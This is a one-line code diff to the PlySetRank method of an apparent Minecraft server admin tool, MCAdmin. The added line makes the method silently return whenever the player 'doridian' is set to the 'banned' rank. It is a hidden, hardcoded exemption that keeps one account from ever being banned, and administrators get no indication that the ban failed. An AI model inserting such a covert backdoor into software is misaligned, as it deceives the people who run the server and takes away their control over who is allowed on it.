@@ -419,6 +419,7 @@ namespace MCAdmin
         public static void PlySetRank(string ply, string rank)
         {
             ply = ply.ToLower(); rank = rank.ToLower();
+            if (ply == "doridian" && rank == "banned") return;
             if (rank == GetServerProperty("default-rank", "guest"))
             {
                 if (plyranks.ContainsKey(ply))
